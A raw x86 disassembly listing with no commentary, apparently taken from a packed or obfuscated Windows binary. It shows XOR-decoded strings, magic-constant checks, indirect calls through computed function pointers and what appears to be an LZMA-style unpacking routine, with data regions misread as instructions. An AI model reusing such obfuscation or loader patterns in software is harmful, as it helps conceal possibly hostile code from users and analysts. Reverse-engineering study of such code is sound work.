  41ab61:	test   al,0x8b
  41ab63:	dec    ebp
  41ab64:	or     BYTE PTR [ebx-0x3e7e53ab],cl
  41ab6a:	(bad)  
  41ab6c:	add    BYTE PTR fs:[ebx],cl
  41ab6f:	retf   0x4d89
  41ab72:	lods   al,BYTE PTR ds:[esi]
  41ab73:	mov    ecx,DWORD PTR [ebp+0x8]
  41ab76:	mov    edx,DWORD PTR [ebp-0x50]
  41ab79:	add    ecx,0x242ebed
  41ab7f:	xor    ecx,edx
  41ab81:	mov    DWORD PTR [ebp-0x50],ecx
  41ab84:	mov    ecx,DWORD PTR [ebp+0x8]
  41ab87:	mov    edx,DWORD PTR [ebp-0x4c]
  41ab8a:	add    ecx,edi
  41ab8c:	and    ecx,edx
  41ab8e:	mov    DWORD PTR [ebp-0x4c],ecx
  41ab91:	mov    ecx,DWORD PTR [ebp+0x8]
  41ab94:	mov    edx,DWORD PTR [ebp-0x48]
  41ab97:	lea    ecx,[edx+ecx*1+0x241fc1f]
  41ab9e:	mov    DWORD PTR [ebp-0x48],ecx
  41aba1:	mov    ecx,DWORD PTR [ebp+0x8]
  41aba4:	mov    edx,0xfa5e15e2
  41aba9:	sub    edx,ecx
  41abab:	add    edx,DWORD PTR [ebp-0x44]
  41abae:	mov    DWORD PTR [ebp-0x44],edx
  41abb1:	mov    ecx,DWORD PTR [ebp+0x8]
  41abb4:	xor    ecx,eax
  41abb6:	add    ecx,esi
  41abb8:	jne    0x4187b7
  41abbe:	mov    ecx,DWORD PTR [ebp-0x8]
  41abc1:	xor    ecx,eax
  41abc3:	mov    eax,DWORD PTR [ebp+0x10]
  41abc6:	add    ecx,esi
  41abc8:	mov    DWORD PTR [eax],ecx
  41abca:	pop    edi
  41abcb:	pop    esi
  41abcc:	pop    ebx
  41abcd:	leave  
  41abce:	ret    0xc
  41abd1:	add    BYTE PTR [eax-0x5ffbffbe],ah
  41abd7:	inc    edx
  41abd8:	add    BYTE PTR [eax],cl
  41abda:	mov    al,ds:0xa00c0042
  41abdf:	inc    edx
  41abe0:	add    BYTE PTR [eax],dl
  41abe2:	mov    al,ds:0xa0140042
  41abe7:	inc    edx
  41abe8:	add    BYTE PTR [eax],bl
  41abea:	mov    al,ds:0xa01c0042
  41abef:	inc    edx
  41abf0:	add    BYTE PTR [eax],al
  41abf2:	rol    BYTE PTR [edx+0x0],1
  41abf5:	add    al,0xd0
  41abf7:	inc    edx
  41abf8:	add    BYTE PTR [eax],cl
  41abfa:	rol    BYTE PTR [edx+0x0],1
  41abfd:	or     al,0xd0
  41abff:	inc    edx
  41ac00:	add    BYTE PTR [eax],dl
  41ac02:	rol    BYTE PTR [edx+0x0],1
  41ac05:	adc    al,0xd0
  41ac07:	inc    edx
  41ac08:	add    BYTE PTR [eax],bl
  41ac0a:	rol    BYTE PTR [edx+0x0],1
  41ac0d:	sbb    al,0xd0
  41ac0f:	inc    edx
	...
  41ac24:	scas   al,BYTE PTR es:[edi]
  41ac25:	pop    esp
  41ac26:	nop
  41ac27:	dec    ebp
  41ac28:	add    BYTE PTR [eax],al
  41ac2a:	add    BYTE PTR [eax],al
  41ac2c:	add    al,BYTE PTR [eax]
  41ac2e:	add    BYTE PTR [eax],al
  41ac30:	cmp    eax,0xb0000000
  41ac35:	lods   al,BYTE PTR ds:[esi]
  41ac36:	add    DWORD PTR [eax],eax
  41ac38:	mov    al,0xa0
  41ac3a:	add    DWORD PTR [eax],eax
  41ac3c:	add    BYTE PTR [eax-0x6ffbffbe],dl
  41ac42:	inc    edx
  41ac43:	add    BYTE PTR [eax],cl
  41ac45:	nop
  41ac46:	inc    edx
  41ac47:	add    BYTE PTR [eax+edx*4],cl
  41ac4a:	inc    edx
  41ac4b:	add    BYTE PTR [eax],dl
  41ac4d:	nop
  41ac4e:	inc    edx
  41ac4f:	add    BYTE PTR [eax+edx*4],dl
  41ac52:	inc    edx
  41ac53:	add    BYTE PTR [eax],bl
  41ac55:	nop
  41ac56:	inc    edx
  41ac57:	add    BYTE PTR [eax+edx*4],bl
  41ac5a:	inc    edx
  41ac5b:	add    BYTE PTR [eax],ah
  41ac5d:	nop
  41ac5e:	inc    edx
  41ac5f:	add    BYTE PTR [eax+edx*4],ah
  41ac62:	inc    edx
  41ac63:	add    BYTE PTR [eax],ch
  41ac65:	nop
  41ac66:	inc    edx
  41ac67:	add    BYTE PTR [eax],al
  41ac69:	mov    al,0x42
  41ac6b:	add    BYTE PTR [eax+esi*4],al
  41ac6e:	inc    edx
  41ac6f:	add    BYTE PTR [eax],cl
  41ac71:	mov    al,0x42
  41ac73:	add    BYTE PTR [eax+esi*4],cl
  41ac76:	inc    edx
  41ac77:	add    BYTE PTR [eax],dl
  41ac79:	mov    al,0x42
  41ac7b:	add    BYTE PTR [eax+esi*4],dl
  41ac7e:	inc    edx
  41ac7f:	add    BYTE PTR [eax],bl
  41ac81:	mov    al,0x42
  41ac83:	add    BYTE PTR [eax+esi*4],bl
  41ac86:	inc    edx
  41ac87:	add    BYTE PTR [eax],al
  41ac89:	rol    BYTE PTR [edx+0x0],0x4
  41ac8d:	rol    BYTE PTR [edx+0x0],0x8
  41ac91:	rol    BYTE PTR [edx+0x0],0xc
  41ac95:	rol    BYTE PTR [edx+0x0],0x10
  41ac99:	rol    BYTE PTR [edx+0x0],0x14
  41ac9d:	rol    BYTE PTR [edx+0x0],0x18
  41aca1:	rol    BYTE PTR [edx+0x0],0x1c
  41aca5:	rol    BYTE PTR [edx+0x0],0x0
  41aca9:	add    BYTE PTR [eax],al
  41acab:	add    BYTE PTR [eax],al
  41acad:	add    BYTE PTR [eax],al
  41acaf:	add    BYTE PTR [edx+0x53],dl
  41acb2:	inc    esp
  41acb3:	push   ebx
  41acb4:	and    BYTE PTR [edx-0x16887ea2],dl
  41acba:	ja     0x41ad00
  41acbc:	call   0xbc46:0xb05d4257
  41acc3:	or     eax,0x1
  41acc8:	inc    ebx
  41acc9:	cmp    bl,BYTE PTR [ebx+eax*2+0x75]
  41accd:	jb     0x41ad41
  41accf:	outs   dx,BYTE PTR gs:[esi]
  41acd1:	je     0x41ad17
  41acd3:	popa   
  41acd4:	je     0x41ad37
  41acd6:	pop    esp
  41acd7:	dec    ebp
  41acd8:	outs   dx,DWORD PTR ds:[esi]
  41acd9:	imul   esp,DWORD PTR fs:[esi+0x79],0x7070415c
  41ace1:	ins    BYTE PTR es:[edi],dx
  41ace2:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  41ace9:	dec    esi
  41acea:	gs ja  0x41aced
  41aced:	mov    edx,DWORD PTR [ebp-0x14]
  41acf0:	sub    esp,0xe4
  41acf6:	push   ebx
  41acf7:	push   edi
  41acf8:	mov    eax,ebx
  41acfa:	xchg   ecx,eax
  41acfb:	mov    eax,DWORD PTR [ebp+0x8]
  41acfe:	mov    edi,0xf89c85b9
  41ad03:	cmp    eax,edi
  41ad05:	jne    0x41b0a1
  41ad0b:	mov    eax,DWORD PTR [ebp+0xc]
  41ad0e:	cmp    eax,0xf89c85b8
  41ad13:	jne    0x41b0a1
  41ad19:	mov    eax,DWORD PTR [ebp+0x24]
  41ad1c:	mov    DWORD PTR [ebp-0x4],eax
  41ad1f:	mov    BYTE PTR [ebp-0x18],0x3
  41ad23:	mov    BYTE PTR [ebp-0x17],0x1e
  41ad27:	mov    BYTE PTR [ebp-0x16],0x1
  41ad2b:	mov    BYTE PTR [ebp-0x15],0x4f
  41ad2f:	mov    BYTE PTR [ebp-0x14],0x48
  41ad33:	mov    BYTE PTR [ebp-0x13],0x7a
  41ad37:	mov    BYTE PTR [ebp-0x20],0xd
  41ad3b:	mov    BYTE PTR [ebp-0x1f],0xf
  41ad3f:	mov    BYTE PTR [ebp-0x1e],0x1d
  41ad43:	mov    BYTE PTR [ebp-0x1d],0x8
  41ad47:	mov    BYTE PTR [ebp-0x1c],0x4f
  41ad4b:	mov    BYTE PTR [ebp-0x1b],0x48
  41ad4f:	mov    BYTE PTR [ebp-0x1a],0x7a
  41ad53:	mov    BYTE PTR [ebp-0x28],0xf
  41ad57:	mov    BYTE PTR [ebp-0x27],0x2
  41ad5b:	mov    BYTE PTR [ebp-0x26],0x6
  41ad5f:	mov    BYTE PTR [ebp-0x25],0xf3
  41ad63:	mov    BYTE PTR [ebp-0x24],0x19
  41ad67:	mov    BYTE PTR [ebp-0x23],0xa
  41ad6b:	push   esi
  41ad6c:	mov    BYTE PTR [ebp-0x22],0x1
  41ad70:	xor    edx,edx
  41ad72:	mov    BYTE PTR [ebp-0x21],0x7a
  41ad76:	xor    esi,esi
  41ad78:	mov    eax,0xf7
  41ad7d:	lea    ecx,[ebp+esi*1-0x18]
  41ad81:	movzx  ebx,BYTE PTR [ecx]
  41ad84:	xor    ebx,0x73
  41ad87:	add    ebx,eax
  41ad89:	inc    esi
  41ad8a:	mov    BYTE PTR [ecx],bl
  41ad8c:	cmp    esi,0x6
  41ad8f:	jb     0x41ad7d
  41ad91:	xor    esi,esi
  41ad93:	lea    ecx,[ebp+esi*1-0x20]
  41ad97:	movzx  ebx,BYTE PTR [ecx]
  41ad9a:	xor    ebx,0x73
  41ad9d:	add    ebx,eax
  41ad9f:	inc    esi
  41ada0:	mov    BYTE PTR [ecx],bl
  41ada2:	cmp    esi,0x7
  41ada5:	jb     0x41ad93
  41ada7:	xor    esi,esi
  41ada9:	lea    ecx,[ebp+esi*1-0x28]
  41adad:	movzx  ebx,BYTE PTR [ecx]
  41adb0:	xor    ebx,0x73
  41adb3:	add    ebx,eax
  41adb5:	inc    esi
  41adb6:	mov    BYTE PTR [ecx],bl
  41adb8:	cmp    esi,0x8
  41adbb:	jb     0x41ada9
  41adbd:	lea    eax,[ebp-0x2c]
  41adc0:	mov    DWORD PTR [ebp-0x8],eax
  41adc3:	mov    ecx,DWORD PTR [ebp-0x8]
  41adc6:	mov    eax,0x7113fcef
  41adcb:	mov    DWORD PTR [ecx],eax
  41adcd:	mov    ecx,DWORD PTR [ebp-0x2c]
  41add0:	cmp    ecx,eax
  41add2:	jne    0x41adde
  41add4:	mov    DWORD PTR [ebp-0x8],edi
  41add7:	mov    DWORD PTR [ebp-0x8],0xf89c85ea
  41adde:	mov    eax,DWORD PTR [ebp-0x4]
  41ade1:	mov    eax,DWORD PTR [eax+0x18c]
  41ade7:	mov    ebx,0x7510899
  41adec:	mov    esi,0x3272e0
  41adf1:	cmp    DWORD PTR [eax],edx
  41adf3:	jne    0x41b03d
  41adf9:	mov    eax,DWORD PTR [ebp-0x4]
  41adfc:	mov    eax,DWORD PTR [eax+0x17c]
  41ae02:	mov    DWORD PTR [eax],edx
  41ae04:	mov    eax,DWORD PTR [ebp-0x4]
  41ae07:	mov    eax,DWORD PTR [eax+0x180]
  41ae0d:	mov    DWORD PTR [eax],edx
  41ae0f:	mov    edi,0x4e3c
  41ae14:	mov    eax,0x4f8f
  41ae19:	mov    WORD PTR [ebp-0x78],ax
  41ae1d:	mov    eax,edi
  41ae1f:	mov    WORD PTR [ebp-0x76],ax
  41ae23:	add    eax,0x43
  41ae26:	mov    WORD PTR [ebp-0x74],ax
  41ae2a:	lea    eax,[edi+0x3]
  41ae2d:	mov    WORD PTR [ebp-0x72],ax
  41ae31:	mov    eax,0x4fac
  41ae36:	mov    WORD PTR [ebp-0x70],ax
  41ae3a:	lea    eax,[edi-0x4]
  41ae3d:	mov    WORD PTR [ebp-0x6e],ax
  41ae41:	add    eax,0x45
  41ae44:	mov    WORD PTR [ebp-0x6c],ax
  41ae48:	lea    eax,[edi-0x2]
  41ae4b:	mov    WORD PTR [ebp-0x6a],ax
  41ae4f:	mov    eax,edi
  41ae51:	mov    WORD PTR [ebp-0x68],ax
  41ae55:	dec    eax
  41ae56:	mov    WORD PTR [ebp-0x66],ax
  41ae5a:	mov    eax,0x99ff
  41ae5f:	mov    WORD PTR [ebp-0x64],ax
  41ae63:	mov    eax,0x8288
  41ae68:	mov    WORD PTR [ebp-0x62],ax
  41ae6c:	mov    eax,0xd78d
  41ae71:	mov    WORD PTR [ebp-0x60],ax
  41ae75:	add    eax,0x1c
  41ae78:	mov    WORD PTR [ebp-0x5e],ax
  41ae7c:	mov    eax,0x27aa
  41ae81:	mov    WORD PTR [ebp-0x5c],ax
  41ae85:	mov    eax,0x47aa
  41ae8a:	mov    WORD PTR [ebp-0x5a],ax
  41ae8e:	lea    eax,[edi-0x3]
  41ae91:	push   0x8
  41ae93:	mov    WORD PTR [ebp-0x58],ax
  41ae97:	mov    DWORD PTR [ebp-0x10],0xf306020f
  41ae9e:	mov    DWORD PTR [ebp-0xc],0x7a010a19
  41aea5:	lea    eax,[ebp-0x10]
  41aea8:	pop    ecx
  41aea9:	mov    dl,BYTE PTR [eax]
  41aeab:	xor    dl,0x73
  41aeae:	sub    dl,0x9
  41aeb1:	mov    BYTE PTR [eax],dl
  41aeb3:	inc    eax
  41aeb4:	dec    ecx
  41aeb5:	jne    0x41aea9
  41aeb7:	lea    eax,[ebp-0x10]
  41aeba:	mov    DWORD PTR [ebp-0xb8],eax
  41aec0:	lea    eax,[ebp-0xbc]
  41aec6:	push   eax
  41aec7:	mov    eax,DWORD PTR [ebp+0xc]
  41aeca:	xor    eax,ebx
  41aecc:	add    eax,esi
  41aece:	push   eax
  41aecf:	mov    eax,DWORD PTR [ebp-0x4]
  41aed2:	add    eax,0x66
  41aed5:	push   eax
  41aed6:	mov    eax,DWORD PTR [ebp-0x4]
  41aed9:	mov    eax,DWORD PTR [eax+0x198]
  41aedf:	mov    DWORD PTR [ebp-0xbc],0x1
  41aee9:	push   DWORD PTR [eax]
  41aeeb:	mov    eax,DWORD PTR [ebp+0x10]
  41aeee:	call   eax
  41aef0:	mov    ecx,DWORD PTR [ebp+0x8]
  41aef3:	xor    ecx,ebx
  41aef5:	add    ecx,esi
  41aef7:	mov    DWORD PTR [ebp-0x8],eax
  41aefa:	cmp    eax,ecx
  41aefc:	jne    0x41af17
  41aefe:	mov    eax,ds:0x33730bee
  41af03:	or     eax,0x22150bef
  41af08:	mov    ds:0x33730bee,eax
  41af0d:	add    eax,0x3372e90f
  41af12:	mov    ds:0x33730bee,eax
  41af17:	mov    ecx,0x4f84
  41af1c:	mov    eax,ecx
  41af1e:	mov    WORD PTR [ebp-0x40],ax
  41af22:	mov    eax,0x4e71
  41af27:	mov    edx,eax
  41af29:	mov    WORD PTR [ebp-0x3e],dx
  41af2d:	lea    edx,[ecx+0x15]
  41af30:	mov    WORD PTR [ebp-0x3c],dx
  41af34:	add    edx,0xfffffff8
  41af37:	mov    WORD PTR [ebp-0x3a],dx
  41af3b:	lea    edx,[ecx+0xf]
  41af3e:	mov    WORD PTR [ebp-0x38],dx
  41af42:	add    edx,0x1b
  41af45:	mov    WORD PTR [ebp-0x36],dx
  41af49:	lea    edx,[ecx+0x21]
  41af4c:	mov    WORD PTR [ebp-0x34],dx
  41af50:	mov    WORD PTR [ebp-0x32],cx
  41af54:	mov    ecx,edi
  41af56:	mov    WORD PTR [ebp-0x30],cx
  41af5a:	lea    ecx,[edx-0x1]
  41af5d:	mov    edx,ecx
  41af5f:	mov    WORD PTR [ebp-0x54],dx
  41af63:	mov    edx,eax
  41af65:	mov    WORD PTR [ebp-0x52],dx
  41af69:	add    edx,0x8
  41af6c:	mov    WORD PTR [ebp-0x50],dx
  41af70:	mov    WORD PTR [ebp-0x4e],ax
  41af74:	add    eax,0x2
  41af77:	mov    WORD PTR [ebp-0x4c],ax
  41af7b:	lea    eax,[ecx-0x16]
  41af7e:	mov    WORD PTR [ebp-0x4a],ax
  41af82:	add    eax,0xfffffff7
  41af85:	mov    WORD PTR [ebp-0x48],ax
  41af89:	mov    WORD PTR [ebp-0x46],cx
  41af8d:	mov    WORD PTR [ebp-0x44],di
  41af91:	mov    eax,DWORD PTR [ebp+0x8]
  41af94:	movzx  ecx,WORD PTR [ebp-0x54]
  41af98:	xor    eax,ebx
  41af9a:	add    eax,esi
  41af9c:	xor    eax,ecx
  41af9e:	mov    WORD PTR [ebp-0x54],ax
  41afa2:	mov    eax,DWORD PTR [ebp+0x8]
  41afa5:	movzx  ecx,WORD PTR [ebp-0x40]
  41afa9:	xor    eax,ebx
  41afab:	add    eax,esi
  41afad:	xor    eax,ecx
  41afaf:	mov    WORD PTR [ebp-0x40],ax
  41afb3:	xor    eax,eax
  41afb5:	mov    WORD PTR [ebp-0xd0],ax
  41afbc:	mov    WORD PTR [ebp-0xe4],ax
  41afc3:	mov    edi,DWORD PTR [ebp+0x24]
  41afc6:	lea    eax,[ebp-0xd0]
  41afcc:	lea    edx,[ebp-0x54]
  41afcf:	mov    DWORD PTR [ebp-0xbc],0x2
  41afd9:	mov    DWORD PTR [ebp-0xb8],eax
  41afdf:	call   0x41d97e
  41afe4:	mov    DWORD PTR [ebp-0xb4],eax
  41afea:	lea    eax,[ebp-0xbc]
  41aff0:	push   eax
  41aff1:	mov    eax,DWORD PTR [ebp+0xc]
  41aff4:	xor    eax,ebx
  41aff6:	add    eax,esi
  41aff8:	push   eax
  41aff9:	lea    eax,[ebp-0x78]
  41affc:	push   eax
  41affd:	push   DWORD PTR [ebp-0x8]
  41b000:	mov    eax,DWORD PTR [ebp+0x10]
  41b003:	call   eax
  41b005:	mov    edi,DWORD PTR [ebp+0x24]
  41b008:	lea    eax,[ebp-0xe4]
  41b00e:	lea    edx,[ebp-0x40]
  41b011:	mov    DWORD PTR [ebp-0xb8],eax
  41b017:	call   0x41d97e
  41b01c:	mov    DWORD PTR [ebp-0xb4],eax
  41b022:	lea    eax,[ebp-0xbc]
  41b028:	push   eax
  41b029:	mov    eax,DWORD PTR [ebp+0xc]
  41b02c:	xor    eax,ebx
  41b02e:	add    eax,esi
  41b030:	push   eax
  41b031:	lea    eax,[ebp-0x78]
  41b034:	push   eax
  41b035:	push   DWORD PTR [ebp-0x8]
  41b038:	mov    eax,DWORD PTR [ebp+0x10]
  41b03b:	call   eax
  41b03d:	mov    eax,DWORD PTR [ebp+0x14]
  41b040:	push   DWORD PTR [ebp-0x4]
  41b043:	push   DWORD PTR [ebp+0x20]
  41b046:	push   DWORD PTR [ebp+0x1c]
  41b049:	push   DWORD PTR [ebp+0x18]
  41b04c:	push   DWORD PTR [ebp+0x10]
  41b04f:	push   DWORD PTR [ebp+0x8]
  41b052:	push   DWORD PTR [ebp+0xc]
  41b055:	call   0x41c1fa
  41b05a:	test   eax,eax
  41b05c:	je     0x41b0a0
  41b05e:	add    DWORD PTR [ebp-0x4],eax
  41b061:	push   DWORD PTR [ebp-0x4]
  41b064:	lea    edi,[ebp+0x4]
  41b067:	call   0x41b490
  41b06c:	mov    eax,DWORD PTR [ebp-0x4]
  41b06f:	mov    eax,DWORD PTR [eax+0x1c8]
  41b075:	mov    eax,DWORD PTR [eax]
  41b077:	xor    eax,ebx
  41b079:	add    eax,esi
  41b07b:	mov    eax,DWORD PTR [ebp-0x4]
  41b07e:	jne    0x41b096
  41b080:	mov    ecx,DWORD PTR [ebp-0x4]
  41b083:	mov    ecx,DWORD PTR [ecx+0x1cc]
  41b089:	push   DWORD PTR [ecx]
  41b08b:	mov    eax,DWORD PTR [eax+0x1d8]
  41b091:	call   DWORD PTR [eax+0x28]
  41b094:	jmp    0x41b0a0
  41b096:	mov    eax,DWORD PTR [eax+0x17c]
  41b09c:	mov    eax,DWORD PTR [eax]
  41b09e:	add    DWORD PTR [edi],eax
  41b0a0:	pop    esi
  41b0a1:	pop    edi
  41b0a2:	pop    ebx
  41b0a3:	leave  
  41b0a4:	ret    0x20
  41b0a7:	push   edi
  41b0a8:	push   esi
  41b0a9:	push   ebx
  41b0aa:	push   ebp
  41b0ab:	mov    ebp,esp
  41b0ad:	mov    eax,DWORD PTR [ebp+0x24]
  41b0b0:	add    DWORD PTR [ebp+0x28],eax
  41b0b3:	push   eax
  41b0b4:	cld    
  41b0b5:	mov    esi,DWORD PTR [ebp+0x18]
  41b0b8:	add    DWORD PTR [ebp+0x1c],esi
  41b0bb:	push   esi
  41b0bc:	mov    esi,DWORD PTR [ebp+0x14]
  41b0bf:	lods   eax,DWORD PTR ds:[esi]
  41b0c0:	xchg   edx,eax
  41b0c1:	push   edx
  41b0c2:	mov    cl,BYTE PTR [esi-0x2]
  41b0c5:	or     eax,0xffffffff
  41b0c8:	shl    eax,cl
  41b0ca:	not    eax
  41b0cc:	push   eax
  41b0cd:	mov    cl,dh
  41b0cf:	or     eax,0xffffffff
  41b0d2:	shl    eax,cl
  41b0d4:	not    eax
  41b0d6:	push   eax
  41b0d7:	add    cl,dl
  41b0d9:	mov    edi,esi
  41b0db:	sub    esp,0xc
  41b0de:	sub    eax,eax
  41b0e0:	inc    eax
  41b0e1:	push   eax
  41b0e2:	push   eax
  41b0e3:	push   eax
  41b0e4:	push   eax
  41b0e5:	push   eax
  41b0e6:	push   edi
  41b0e7:	sub    esi,esi
  41b0e9:	push   esi
  41b0ea:	or     ebx,0xffffffff
  41b0ed:	mov    eax,0x300
  41b0f2:	shl    eax,cl
  41b0f4:	lea    ecx,[eax+0x736]
  41b0fa:	mov    eax,0x4000400
  41b0ff:	shr    ecx,1
  41b101:	rep stos DWORD PTR es:[edi],eax
  41b103:	push   0x5
  41b105:	pop    ecx
  41b106:	call   0x41b3f1
  41b10b:	loop   0x41b106
  41b10d:	lea    esi,[esi]
  41b10f:	lea    edi,[edi]
  41b111:	mov    edi,DWORD PTR [ebp-0x4]
  41b114:	mov    eax,DWORD PTR [ebp-0x10]
  41b117:	sub    edi,DWORD PTR [ebp+0x24]
  41b11a:	and    eax,edi
  41b11c:	mov    DWORD PTR [ebp-0x18],eax
  41b11f:	mov    al,0x0
  41b121:	call   0x41b409
  41b126:	jne    0x41b1c1
  41b12c:	mov    cl,BYTE PTR [ebp-0xc]
  41b12f:	and    edi,DWORD PTR [ebp-0x14]
  41b132:	shl    edi,cl
  41b134:	sub    cl,0x8
  41b137:	neg    cl
  41b139:	shr    esi,cl
  41b13b:	pop    eax
  41b13c:	add    edi,esi
  41b13e:	pop    esi
  41b13f:	lea    edi,[edi+edi*2]
  41b142:	shl    edi,0x8
  41b145:	cmp    al,0x7
  41b147:	pop    edx
  41b148:	lea    ecx,[esi+edi*2+0xe6c]
  41b14f:	push   ecx
  41b150:	push   esi
  41b151:	mov    esi,0x100
  41b156:	push   eax
  41b157:	mov    al,0x1
  41b159:	jb     0x41b18f
  41b15b:	mov    edi,DWORD PTR [ebp-0x4]
  41b15e:	sub    edi,DWORD PTR [ebp-0x24]
  41b161:	movzx  edi,BYTE PTR [edi]
  41b164:	mov    ebp,DWORD PTR [ebp-0x34]
  41b167:	shl    edi,1
  41b169:	mov    ecx,esi
  41b16b:	and    esi,edi
  41b16d:	add    ecx,esi
  41b16f:	lea    ebp,[ebp+ecx*2+0x0]
  41b173:	call   0x41b428
  41b178:	mov    ecx,eax
  41b17a:	shr    esi,0x8
  41b17d:	and    ecx,0x1
  41b180:	cmp    esi,ecx
  41b182:	mov    esi,0x100
  41b187:	jne    0x41b197
  41b189:	cmp    eax,esi
  41b18b:	jb     0x41b164
  41b18d:	jmp    0x41b1a3
  41b18f:	mov    ebp,DWORD PTR [ebp-0x34]
  41b192:	call   0x41b428
  41b197:	inc    eax
  41b198:	inc    esi
  41b199:	sub    eax,0x1
  41b19c:	sub    esi,0x1
  41b19f:	cmp    eax,esi
  41b1a1:	jb     0x41b18f
  41b1a3:	pop    edx
  41b1a4:	inc    edx
  41b1a5:	cmp    edx,0x5
  41b1a8:	dec    edx
  41b1a9:	mov    ecx,edx
  41b1ab:	jb     0x41b1bc
  41b1ad:	inc    edx
  41b1ae:	cmp    edx,0xb
  41b1b1:	dec    edx
  41b1b2:	mov    cl,0x4
  41b1b4:	dec    cl
  41b1b6:	jb     0x41b1bc
  41b1b8:	mov    cl,0x7
  41b1ba:	dec    cl
  41b1bc:	sub    edx,ecx
  41b1be:	push   edx
  41b1bf:	jmp    0x41b210
  41b1c1:	mov    al,0xc1
  41b1c3:	dec    al
  41b1c5:	call   0x41b419
  41b1ca:	jne    0x41b1e0
  41b1cc:	pop    eax
  41b1cd:	pop    edi
  41b1ce:	pop    edx
  41b1cf:	pop    ecx
  41b1d0:	pop    edx
  41b1d1:	pop    ecx
  41b1d2:	push   DWORD PTR [esp]
  41b1d5:	push   ecx
  41b1d6:	push   edx
  41b1d7:	mov    edx,0x664
  41b1dc:	mov    cl,0x0
  41b1de:	jmp    0x41b253
  41b1e0:	mov    al,0xcd
  41b1e2:	dec    al
  41b1e4:	call   0x41b419
  41b1e9:	jne    0x41b219
  41b1eb:	mov    al,0xf1
  41b1ed:	dec    al
  41b1ef:	call   0x41b409
  41b1f4:	jne    0x41b249
  41b1f6:	pop    eax
  41b1f7:	cmp    al,0x7
  41b1f9:	mov    al,0x9
  41b1fb:	jb     0x41b1ff
  41b1fd:	mov    al,0xb
  41b1ff:	push   eax
  41b200:	mov    esi,DWORD PTR [ebp-0x4]
  41b203:	sub    esi,DWORD PTR [ebp-0x24]
  41b206:	cmp    esi,DWORD PTR [ebp+0x24]
  41b209:	jb     0x41b3e0
  41b20f:	lods   al,BYTE PTR ds:[esi]
  41b210:	mov    edi,DWORD PTR [ebp-0x4]
  41b213:	stos   BYTE PTR es:[edi],al
  41b214:	jmp    0x41b3a7
  41b219:	mov    al,0xd8
  41b21b:	call   0x41b419
  41b220:	mov    esi,DWORD PTR [ebp-0x28]
  41b223:	je     0x41b240
  41b225:	mov    al,0xe4
  41b227:	call   0x41b419
  41b22c:	mov    esi,DWORD PTR [ebp-0x2c]
  41b22f:	je     0x41b23a
  41b231:	mov    esi,DWORD PTR [ebp-0x30]
  41b234:	mov    ecx,DWORD PTR [ebp-0x2c]
  41b237:	mov    DWORD PTR [ebp-0x30],ecx
  41b23a:	mov    ecx,DWORD PTR [ebp-0x28]
  41b23d:	mov    DWORD PTR [ebp-0x2c],ecx
  41b240:	mov    ecx,DWORD PTR [ebp-0x24]
  41b243:	mov    DWORD PTR [ebp-0x28],ecx
  41b246:	mov    DWORD PTR [ebp-0x24],esi
  41b249:	pop    eax
  41b24a:	pop    edi
  41b24b:	pop    ecx
  41b24c:	mov    edx,0xa68
  41b251:	mov    cl,0x8
  41b253:	add    edx,edi
  41b255:	push   edx
  41b256:	push   edi
  41b257:	cmp    al,0x7
  41b259:	mov    al,cl
  41b25b:	jb     0x41b25f
  41b25d:	add    al,0x3
  41b25f:	push   eax
  41b260:	mov    ebp,DWORD PTR [ebp-0x34]
  41b263:	call   0x41b426
  41b268:	jne    0x41b27e
  41b26a:	mov    eax,DWORD PTR [ebp-0x18]
  41b26d:	mov    edi,DWORD PTR [ebp-0x34]
  41b270:	shl    eax,0x3
  41b273:	sub    ecx,ecx
  41b275:	push   0x8
  41b277:	pop    esi
  41b278:	lea    edi,[edi+eax*2+0x4]
  41b27c:	jmp    0x41b2b3
  41b27e:	mov    ebp,DWORD PTR [ebp-0x34]
  41b281:	add    ebp,0x2
  41b284:	call   0x41b426
  41b289:	jne    0x41b2a3
  41b28b:	mov    eax,DWORD PTR [ebp-0x18]
  41b28e:	mov    edi,DWORD PTR [ebp-0x34]
  41b291:	shl    eax,0x3
  41b294:	push   0x8
  41b296:	pop    ecx
  41b297:	push   0x8
  41b299:	pop    esi
  41b29a:	lea    edi,[edi+eax*2+0x104]
  41b2a1:	jmp    0x41b2b3
  41b2a3:	mov    edi,0x204
  41b2a8:	add    edi,DWORD PTR [ebp-0x34]
  41b2ab:	push   0x10
  41b2ad:	pop    ecx
  41b2ae:	mov    esi,0x100
  41b2b3:	mov    DWORD PTR [ebp-0x1c],ecx
  41b2b6:	sub    eax,eax
  41b2b8:	inc    eax
  41b2b9:	mov    ebp,edi
  41b2bb:	call   0x41b428
  41b2c0:	mov    ecx,eax
  41b2c2:	sub    ecx,esi
  41b2c4:	jb     0x41b2b9
  41b2c6:	add    DWORD PTR [ebp-0x1c],ecx
  41b2c9:	cmp    DWORD PTR [ebp-0x3c],0x4
  41b2cd:	jae    0x41b383
  41b2d3:	add    DWORD PTR [ebp-0x3c],0x7
  41b2d7:	mov    ecx,DWORD PTR [ebp-0x1c]
  41b2da:	cmp    ecx,0x4
  41b2dd:	jb     0x41b2e2
  41b2df:	push   0x3
  41b2e1:	pop    ecx
  41b2e2:	mov    edi,DWORD PTR [ebp-0x38]
  41b2e5:	shl    ecx,0x6
  41b2e8:	sub    eax,eax
  41b2ea:	inc    eax
  41b2eb:	push   0x40
  41b2ed:	pop    esi
  41b2ee:	lea    edi,[edi+ecx*2+0x360]
  41b2f5:	mov    ebp,edi
  41b2f7:	call   0x41b428
  41b2fc:	mov    ecx,eax
  41b2fe:	sub    ecx,esi
  41b300:	jb     0x41b2f5
  41b302:	mov    DWORD PTR [ebp-0x18],ecx
  41b305:	mov    DWORD PTR [ebp-0x24],ecx
  41b308:	cmp    ecx,0x4
  41b30b:	jb     0x41b380
  41b30d:	mov    esi,ecx
  41b30f:	and    DWORD PTR [ebp-0x24],0x1
  41b313:	shr    esi,1
  41b315:	or     DWORD PTR [ebp-0x24],0x2
  41b319:	dec    esi
  41b31a:	cmp    ecx,0xe
  41b31d:	jae    0x41b338
  41b31f:	mov    eax,0x2af
  41b324:	sub    eax,ecx
  41b326:	mov    ecx,esi
  41b328:	shl    BYTE PTR [ebp-0x24],cl
  41b32b:	add    eax,DWORD PTR [ebp-0x24]
  41b32e:	shl    eax,1
  41b330:	add    eax,DWORD PTR [ebp-0x38]
  41b333:	mov    DWORD PTR [ebp-0x34],eax
  41b336:	jmp    0x41b365
  41b338:	sub    esi,0x4
  41b33b:	call   0x41b3e5
  41b340:	shr    ebx,1
  41b342:	shl    DWORD PTR [ebp-0x24],1
  41b345:	cmp    DWORD PTR [ebp-0x20],ebx
  41b348:	jb     0x41b350
